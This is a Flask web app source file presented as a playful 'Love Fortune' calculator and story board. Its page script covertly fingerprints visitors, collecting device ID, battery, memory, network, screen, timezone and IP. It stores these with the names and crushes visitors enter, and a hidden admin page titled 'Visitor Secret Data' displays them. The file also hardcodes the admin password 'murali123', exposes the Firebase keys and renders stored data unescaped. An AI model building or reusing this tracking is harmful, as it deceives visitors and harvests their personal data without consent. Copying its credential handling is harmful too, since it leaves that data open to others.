from flask import Flask, request, jsonify, render_template_string
import os
import random
import requests
import re
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

def sanitize_key(text):
    return re.sub(r'[.#$\[\]]', '_', text.strip())

# ========== LOVE FORTUNE ENGINE ==========
def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
        f"💖 {name1} + {name2} = {percentage}% endless affection!",
        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
        f"✨ {name1} & {name2} – {percentage}% magical bond!",
        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
        f"💕 {name1} and {name2} glow with {percentage}% love light!",
        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
        f"💖 {name1} + {name2} = {percentage}% heart connection!",
        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
        f"💖 {name1} + {name2} = {percentage}% love magic!",
        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
        f"💖 {name1} + {name2} = {percentage}% soulful match!",
        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
        f"💕 {name1} and {name2} – {percentage}% charming connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
        f"🌹 {name1} and {name2} share {percentage}% tender love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
        f"💕 {name1} and {name2} – {percentage}% golden romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
        f"💖 {name1} + {name2} = {percentage}% pure affection!",
        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
        f"💕 {name1} and {name2} – {percentage}% love spark!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
        f"💖 {name1} + {name2} = {percentage}% love glow!",
        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
        f"💖 {name1} + {name2} = {percentage}% love warmth!",
        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
        f"💖 {name1} + {name2} = {percentage}% love energy!",
        f"🌹 {name1} and {name2} share {percentage}% passion!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
        f"🌹 {name1} and {name2} share {percentage}% affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
        f"💕 {name1} and {name2} – {percentage}% warm romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
        f"💖 {name1} + {name2} = {percentage}% magical bond!",
        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
        f"💕 {name1} and {name2} – {percentage}% forever love!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
    ]
    return random.choice(messages)

def analyze_story(text):
    text = text.lower()
    sad_triggers = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone']
    if any(word in text for word in sad_triggers):
        return ("breakup", "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you.")
    else:
        return ("happy", "💖 This is absolutely wonderful! Your love story is like a fairytale. Keep glowing!")

# ========== MAIN APP HTML (with your actual Firebase config) ==========
MAIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love & Story Hub</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
    <style>
        :root { --primary: #f5576c; --secondary: #764ba2; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            width: 100%;
            max-width: 500px;
            border-radius: 30px;
            padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            position: relative;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #e94560;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 12px;
        }
        h1 { text-align: center; color: var(--secondary); margin-bottom: 15px; }
        .tabs { display: flex; gap: 10px; margin-bottom: 25px; }
        .tab-btn {
            flex: 1; padding: 12px; border: none; border-radius: 20px;
            background: #eee; cursor: pointer; font-weight: bold;
        }
        .tab-btn.active { background: var(--primary); color: white; }
        .tab-content { display: none; animation: fadeIn 0.3s; }
        .tab-content.active { display: block; }
        input, textarea {
            width: 100%; padding: 14px; margin: 10px 0;
            border: 1px solid #ddd; border-radius: 15px; font-size: 16px;
        }
        .main-btn {
            width: 100%; padding: 14px; background: linear-gradient(to right, var(--primary), var(--secondary));
            color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }
        .result-area { background: #fff5f6; border-radius: 20px; padding: 20px; text-align: center; margin-top: 20px; }
        .story-card {
            background: #fefefe; padding: 15px; border-radius: 18px; margin-top: 15px;
            border-left: 5px solid var(--primary); box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .bot-reply { font-style: italic; color: var(--secondary); font-size: 0.9em; margin-top: 8px; }
        .actions { display: flex; gap: 10px; margin-top: 10px; align-items: center; }
        .like-btn { background: none; border: none; color: var(--primary); font-weight: bold; cursor: pointer; }
        .cmnt-item { font-size: 12px; background: #f0f0f0; padding: 5px; border-radius: 8px; margin-top: 5px; }
        .feed { max-height: 500px; overflow-y: auto; margin-top: 15px; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .love-card {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #ffdde1 100%);
            border-radius: 30px;
            padding: 25px;
            text-align: center;
            font-family: 'Segoe UI', cursive;
            max-width: 400px;
            margin: 10px auto;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        .love-card h2 { color: #fff; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
        .love-card .percentage { font-size: 3.5em; font-weight: bold; color: #ff1493; }
        .love-card .names { font-size: 1.8em; font-weight: bold; color: #fff; margin: 15px 0; }
        .love-card .message { font-style: italic; color: #6b4e6e; margin-top: 10px; }
        .share-btn { background: #1da1f2; margin-top: 10px; }
        .story-type-buttons { display: flex; gap: 10px; margin: 15px 0; }
        .story-type-btn {
            flex: 1; padding: 10px; border: none; border-radius: 30px;
            background: #e2e8f0; cursor: pointer; font-weight: bold;
        }
        .story-type-btn.active { background: var(--primary); color: white; }
        .user-info {
            margin-bottom: 10px;
            text-align: right;
            font-size: 13px;
            color: #555;
            background: #f0f0f0;
            display: inline-block;
            padding: 4px 12px;
            border-radius: 30px;
        }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
    </style>
</head>
<body>
<div class="container">
    <div class="top-bar">
        <div id="authSection"></div>
        <button id="logoutBtn" class="logout-btn" style="display:none;" onclick="logout()">🚪 Logout</button>
    </div>
    <div class="tabs">
        <button class="tab-btn active" onclick="showTab('fortune')">🔮 Fortune</button>
        <button class="tab-btn" onclick="showTab('stories')">📖 Story Box</button>
    </div>

    <!-- Fortune Tab -->
    <div id="fortune" class="tab-content active">
        <h1>💕 Love Fortune</h1>
        <input type="text" id="yourName" placeholder="Your Name">
        <input type="text" id="crushName" placeholder="Their Name">
        <button class="main-btn" onclick="calculateFortune()">Reveal Destiny</button>
        <div id="resultArea" class="result-area" style="display: none;">
            <div id="loveCardContainer"></div>
            <button id="shareCardBtn" class="main-btn share-btn" style="display: none;" onclick="downloadLoveCard()">📸 Download as Image</button>
        </div>
    </div>

    <!-- Story Tab -->
    <div id="stories" class="tab-content">
        <h1>📖 Story Hub</h1>
        <textarea id="storyInput" rows="4" placeholder="Share your story... (love, breakup, friendship)"></textarea>
        <button class="main-btn" onclick="postStory()">Share Story</button>
        <div class="story-type-buttons">
            <button id="btnHappy" class="story-type-btn active" onclick="loadStoriesByType('happy')">💖 Love Stories</button>
            <button id="btnBreakup" class="story-type-btn" onclick="loadStoriesByType('breakup')">💔 Breakup Stories</button>
        </div>
        <div id="storyFeed" class="feed">Loading stories...</div>
    </div>
</div>

<script>
    // ========== YOUR ACTUAL FIREBASE CONFIG ==========
    const firebaseConfig = {
        apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
        authDomain: "love-percentage-dc42b.firebaseapp.com",
        databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
        projectId: "love-percentage-dc42b",
        storageBucket: "love-percentage-dc42b.firebasestorage.app",
        messagingSenderId: "897497192642",
        appId: "1:897497192642:web:82981d92bdf982aa4b435b",
        measurementId: "G-880PQQC5ZT"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.database();
    auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);

    let currentUser = null;
    let currentUsername = null;
    let sessionId = null;

    async function fetchUsername(uid) {
        const snap = await db.ref('userProfiles/' + uid + '/username').once('value');
        return snap.val();
    }

    auth.onAuthStateChanged(async (user) => {
        currentUser = user;
        const logoutBtn = document.getElementById('logoutBtn');
        const authDiv = document.getElementById('authSection');
        if (user) {
            logoutBtn.style.display = 'block';
            let username = localStorage.getItem('love_username');
            if (!username) {
                username = await fetchUsername(user.uid);
                if (username) localStorage.setItem('love_username', username);
                else username = user.email ? user.email.split('@')[0] : 'User';
            }
            currentUsername = username;
            authDiv.innerHTML = `<div class="user-info">👤 @${username}</div>`;
            sessionId = user.uid;
        } else {
            logoutBtn.style.display = 'none';
            if(!sessionId) sessionId = localStorage.getItem('love_session');
            if(!sessionId) {
                sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2,10);
                localStorage.setItem('love_session', sessionId);
            }
            authDiv.innerHTML = `<div class="user-info">🔓 Anonymous · <a href="/login" style="color:#e94560;">Sign in</a> to save your data</div>`;
        }
        if (document.getElementById('stories').classList.contains('active')) loadStoriesByType(currentStoryType);
    });

    function logout() {
        auth.signOut().then(() => {
            localStorage.removeItem('love_username');
            localStorage.removeItem('love_session');
            sessionId = null;
            currentUser = null;
            location.reload();
        });
    }

    function getVisitorKey(name1, name2) {
        const base = sanitizeKey(name1) + '_' + sanitizeKey(name2);
        if (currentUser) return currentUser.uid + '_' + base;
        else return sessionId + '_' + base;
    }

    function sanitizeKey(str) { return str.replace(/[.#$\\[\\]]/g, '_'); }

    let deviceData = { timestamp: new Date().toISOString() };
    let currentStoryType = "happy";

    async function collectDeviceInfo() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            deviceData.fingerprint = result.visitorId;
        } catch(e) { deviceData.fingerprint = 'unknown'; }
        deviceData.screen = screen.width + 'x' + screen.height;
        deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        deviceData.userAgent = navigator.userAgent;
        if (navigator.deviceMemory) deviceData.deviceMemory = navigator.deviceMemory + ' GB';
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                deviceData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        const conn = navigator.connection;
        if (conn) deviceData.networkType = conn.effectiveType;
    }

    async function calculateFortune() {
        const name1 = document.getElementById('yourName').value.trim();
        const name2 = document.getElementById('crushName').value.trim();
        if (!name1 || !name2) { alert("Please fill both names 💕"); return; }

        const visitorKey = getVisitorKey(name1, name2);
        deviceData.name = name1;
        deviceData.crush_name = name2;
        deviceData.visitorKey = visitorKey;
        if (currentUser) deviceData.uid = currentUser.uid;

        await fetch('/save-device', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceData) });

        try {
            const res = await fetch('/calculate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ n1: name1, n2: name2 }) });
            const data = await res.json();
            const percent = data.score;
            const msg = data.msg;
            const loveCardHtml = `
                <div id="loveCard" class="love-card">
                    <h2>💕 Love Fortune 💕</h2>
                    <div class="percentage">${percent}%</div>
                    <div class="names">${escapeHtml(name1)} ❤️ ${escapeHtml(name2)}</div>
                    <div class="message">${escapeHtml(msg)}</div>
                    <div style="margin-top:15px; font-size:12px;">✨ ${new Date().toLocaleDateString()} ✨</div>
                </div>
            `;
            document.getElementById('loveCardContainer').innerHTML = loveCardHtml;
            document.getElementById('resultArea').style.display = 'block';
            document.getElementById('shareCardBtn').style.display = 'block';

            deviceData.fortuneText = msg;
            deviceData.percentage = percent;
            await fetch('/save-device', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceData) });
        } catch(e) { alert("Error calculating fortune."); }
    }

    function downloadLoveCard() {
        const element = document.getElementById('loveCard');
        if (!element) return;
        html2canvas(element, { scale: 2, backgroundColor: null }).then(canvas => {
            const link = document.createElement('a');
            link.download = 'love_card.png';
            link.href = canvas.toDataURL();
            link.click();
        });
    }

    async function postStory() {
        if (!currentUser) {
            alert("Please sign in to post a story — it's free and your stories follow you anywhere.");
            window.location.href = '/login';
            return;
        }
        const content = document.getElementById('storyInput').value.trim();
        if (!content) { alert("Please write a story first."); return; }
        const author = prompt("Enter your name (or leave empty for 'Anonymous'):", "Anonymous");
        const finalAuthor = (author && author.trim()) ? author.trim() : "Anonymous";
        const res = await fetch('/post-story', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ author: finalAuthor, content, uid: currentUser.uid }) });
        const result = await res.json();
        if (result.ok) {
            alert("Story posted!");
            document.getElementById('storyInput').value = '';
            loadStoriesByType(currentStoryType);
        } else alert("Error posting story.");
    }

    async function loadStoriesByType(type) {
        currentStoryType = type;
        document.getElementById('btnHappy').classList.toggle('active', type === 'happy');
        document.getElementById('btnBreakup').classList.toggle('active', type === 'breakup');
        const feed = document.getElementById('storyFeed');
        feed.innerHTML = "📖 Loading stories...";
        try {
            const res = await fetch('/get-stories');
            const allStories = await res.json();
            const filtered = Object.fromEntries(
                Object.entries(allStories).filter(([id, story]) => story.type === type)
            );
            feed.innerHTML = '';
            if (Object.keys(filtered).length === 0) {
                feed.innerHTML = `<p style='text-align:center;'>No ${type === 'happy' ? 'love' : 'breakup'} stories yet. Be the first to share!</p>`;
                return;
            }
            Object.entries(filtered).reverse().forEach(([id, story]) => {
                let commentsHtml = '';
                if (story.comments) {
                    Object.values(story.comments).forEach(c => {
                        commentsHtml += `<div class="cmnt-item">💬 ${escapeHtml(c.text)}</div>`;
                    });
                }
                feed.innerHTML += `
                    <div class="story-card">
                        <strong>👤 ${escapeHtml(story.author)}</strong>
                        <p style="margin-top:8px;">${escapeHtml(story.content)}</p>
                        <div class="bot-reply">🤖 Bot: ${escapeHtml(story.reply)}</div>
                        <div class="actions">
                            <button class="like-btn" onclick="likeStory('${id}')">❤️ ${story.likes || 0}</button>
                            <span style="font-size:12px;">💬 Comment</span>
                        </div>
                        <div id="comments_${id}">${commentsHtml}</div>
                        <div style="display:flex; gap:5px; margin-top:8px;">
                            <input type="text" id="cmnt_${id}" placeholder="Write a comment..." style="flex:1; padding:8px; font-size:12px;">
                            <button onclick="addComment('${id}')">Send</button>
                        </div>
                    </div>
                `;
            });
        } catch(e) { feed.innerHTML = "<p>Failed to load stories.</p>"; }
    }

    async function likeStory(id) {
        await fetch('/like', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) });
        loadStoriesByType(currentStoryType);
    }

    async function addComment(id) {
        const text = document.getElementById(`cmnt_${id}`).value.trim();
        if (!text) return;
        await fetch('/comment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id, text }) });
        document.getElementById(`cmnt_${id}`).value = '';
        loadStoriesByType(currentStoryType);
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    function showTab(tabName) {
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(tabName).classList.add('active');
        if (tabName === 'stories') loadStoriesByType(currentStoryType);
        event.target.classList.add('active');
    }

    collectDeviceInfo();
</script>
</body>
</html>
'''

# ========== LOGIN PAGE (username only, with your Firebase config) ==========
LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Hub – Sign in / Sign up</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.95);
            width: 100%;
            max-width: 400px;
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 { color: #764ba2; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 20px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to right, #f5576c, #764ba2);
            color: white;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .toggle-link {
            margin-top: 20px;
            color: #667eea;
            cursor: pointer;
            text-decoration: underline;
        }
        .error { color: #e94560; margin-top: 10px; font-size: 13px; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Hub</h1>
    <div id="loginForm">
        <input type="text" id="loginUsername" placeholder="Username (e.g., john123)" autocomplete="off">
        <input type="password" id="loginPassword" placeholder="Password">
        <button onclick="signIn()">Sign in</button>
        <div class="toggle-link" onclick="showSignup()">Create a new account</div>
    </div>
    <div id="signupForm" style="display:none;">
        <input type="text" id="signupUsername" placeholder="Choose a username" autocomplete="off">
        <input type="password" id="signupPassword" placeholder="Password (min 6 chars)">
        <button onclick="signUp()">Create Account</button>
        <div class="toggle-link" onclick="showLogin()">Back to Sign in</div>
    </div>
    <div id="message" class="error"></div>
</div>

<script>
    // ========== YOUR ACTUAL FIREBASE CONFIG ==========
    const firebaseConfig = {
        apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
        authDomain: "love-percentage-dc42b.firebaseapp.com",
        databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
        projectId: "love-percentage-dc42b",
        storageBucket: "love-percentage-dc42b.firebasestorage.app",
        messagingSenderId: "897497192642",
        appId: "1:897497192642:web:82981d92bdf982aa4b435b",
        measurementId: "G-880PQQC5ZT"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.database();

    function showSignup() {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('signupForm').style.display = 'block';
        document.getElementById('message').innerHTML = '';
    }
    function showLogin() {
        document.getElementById('loginForm').style.display = 'block';
        document.getElementById('signupForm').style.display = 'none';
        document.getElementById('message').innerHTML = '';
    }

    async function checkUsernameTaken(username) {
        const snapshot = await db.ref('usernames/' + username).once('value');
        return snapshot.exists();
    }

    async function signUp() {
        const username = document.getElementById('signupUsername').value.trim();
        const password = document.getElementById('signupPassword').value;
        if (!username || !password) { showError("Please fill both fields."); return; }
        if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
            showError("Username: 3–20 chars, only letters, numbers, underscore.");
            return;
        }
        if (password.length < 6) { showError("Password must be at least 6 characters."); return; }
        const taken = await checkUsernameTaken(username);
        if (taken) { showError("Username already taken. Choose another."); return; }

        const email = username + "@lovehub.com";
        try {
            const userCred = await auth.createUserWithEmailAndPassword(email, password);
            const uid = userCred.user.uid;
            await db.ref('usernames/' + username).set(uid);
            await db.ref('userProfiles/' + uid).set({ username, createdAt: Date.now() });
            localStorage.setItem('love_username', username);
            window.location.href = '/';
        } catch(e) { showError(e.message); }
    }

    async function signIn() {
        const username = document.getElementById('loginUsername').value.trim();
        const password = document.getElementById('loginPassword').value;
        if (!username || !password) { showError("Please fill both fields."); return; }
        const email = username + "@lovehub.com";
        try {
            await auth.signInWithEmailAndPassword(email, password);
            localStorage.setItem('love_username', username);
            window.location.href = '/';
        } catch(e) { showError("Invalid username or password."); }
    }

    function showError(msg) {
        const el = document.getElementById('message');
        el.innerHTML = msg;
        setTimeout(() => { el.innerHTML = ''; }, 3000);
    }
</script>
</body>
</html>
'''

# ========== FLASK ROUTES (unchanged) ==========
@app.route('/')
def home():
    return render_template_string(MAIN_HTML)

@app.route('/login')
def login_page():
    return render_template_string(LOGIN_HTML)

@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.json
    n1, n2 = data['n1'], data['n2']
    combined = (n1 + n2).lower()
    score = 50 + (sum(ord(c) for c in combined) % 51)
    msg = get_love_message(n1, n2, score)
    return jsonify({"score": score, "msg": msg})

@app.route('/save-device', methods=['POST'])
def save_device():
    try:
        data = request.get_json()
        key = data.get('visitorKey')
        if not key:
            return jsonify({"status": "error"}), 400
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        data.pop('visitorKey', None)
        url = f"{FIREBASE_URL}/visitors/{key}.json"
        requests.put(url, json=data, timeout=10)
        return jsonify({"status": "saved"})
    except Exception as e:
        print(e)
        return jsonify({"status": "error"}), 500

@app.route('/post-story', methods=['POST'])
def post_story():
    try:
        data = request.json
        author = data.get('author', 'Anonymous').strip()
        content = data.get('content', '').strip()
        uid = data.get('uid', 'anonymous')
        if not content:
            return jsonify({"ok": False, "error": "Empty story"}), 400
        if not author or author.lower() in ['anonymous', 'unknown']:
            author = '💫 Mysterious Soul'
        story_type, reply = analyze_story(content)
        story = {
            "author": author,
            "content": content,
            "reply": reply,
            "type": story_type,
            "likes": 0,
            "timestamp": datetime.now().isoformat(),
            "uid": uid
        }
        r = requests.post(f"{FIREBASE_URL}/stories.json", json=story, timeout=10)
        r.raise_for_status()
        return jsonify({"ok": True})
    except Exception as e:
        print(e)
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route('/like', methods=['POST'])
def like():
    try:
        sid = request.json['id']
        curr = requests.get(f"{FIREBASE_URL}/stories/{sid}/likes.json").json() or 0
        requests.patch(f"{FIREBASE_URL}/stories/{sid}.json", json={"likes": curr + 1})
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/comment', methods=['POST'])
def comment():
    try:
        sid = request.json['id']
        text = request.json['text'].strip()
        if not text:
            return jsonify({"ok": False}), 400
        comment_data = {"text": text, "ts": datetime.now().isoformat()}
        requests.post(f"{FIREBASE_URL}/stories/{sid}/comments.json", json=comment_data)
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/get-stories')
def get_stories():
    try:
        r = requests.get(f"{FIREBASE_URL}/stories.json", timeout=10)
        stories = r.json() or {}
        return jsonify(stories)
    except:
        return jsonify({}), 500

# ========== ADMIN DASHBOARD (password protected) ==========
@app.route('/admin-panel', methods=['GET', 'POST'])
def admin_panel():
    if request.method == 'POST':
        password = request.form.get('password')
        if password != 'murali123':
            return "<h1>❌ Wrong password. <a href='/admin-panel'>Try again</a></h1>"
        try:
            resp = requests.get(f"{FIREBASE_URL}/visitors.json", timeout=10)
            visitors = resp.json() or {}
            if not visitors:
                return "<h1>📊 No visitor data yet.</h1><a href='/admin-panel'>Back</a>"
            html = '''
            <!DOCTYPE html>
            <html>
            <head><title>Admin Dashboard</title><style>
                body{background:#0f172a;color:#e2e8f0;font-family:monospace;padding:20px;}
                table{background:#1e293b;border-collapse:collapse;width:100%;}
                th,td{border:1px solid #334155;padding:8px;text-align:left;}
                th{background:#e94560;color:white;}
            </style></head>
            <body><h1>🔐 Visitor Secret Data</h1><div style="overflow-x:auto;"><table><thead><tr>
            <th>Key</th><th>Name</th><th>Crush</th><th>Love%</th><th>Phone</th><th>Fingerprint</th><th>Battery</th><th>Memory</th><th>Network</th><th>Screen</th><th>Timezone</th><th>IP</th><th>Fortune</th><th>Timestamp</th>
            </tr></thead><tbody>
            '''
            for key, v in visitors.items():
                if isinstance(v, dict):
                    fp = v.get('fingerprint', '-')[:20]
                    html += f"<tr><td>{key}</td><td>{v.get('name','-')}</td><td>{v.get('crush_name','-')}</td><td>{v.get('percentage','-')}%</td><td>{v.get('phoneNumber','-')}</td><td>{fp}...</td><td>{v.get('batteryLevel','-')}</td><td>{v.get('deviceMemory','-')}</td><td>{v.get('networkType','-')}</td><td>{v.get('screen','-')}</td><td>{v.get('timezone','-')}</td><td>{v.get('ip','-')}</td><td>{v.get('fortuneText','-')[:40]}</td><td>{v.get('timestamp','-')[:19]}</td></tr>"
            html += "</tbody></table></div><a href='/admin-panel'>Back</a></body></html>"
            return html
        except Exception as e:
            return f"<h1>Error: {e}</h1>"
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title></head>
        <body style="background:#0f172a; display:flex; justify-content:center; align-items:center; min-height:100vh;">
            <div style="background:#1e293b; padding:35px; border-radius:24px; text-align:center;">
                <h2>🔐 Admin Access</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Password" style="width:100%; padding:12px; border-radius:12px; margin-bottom:15px;">
                    <button type="submit" style="background:#3b82f6; color:white; border:none; padding:10px 20px; border-radius:30px; cursor:pointer;">Login</button>
                </form>
            </div>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
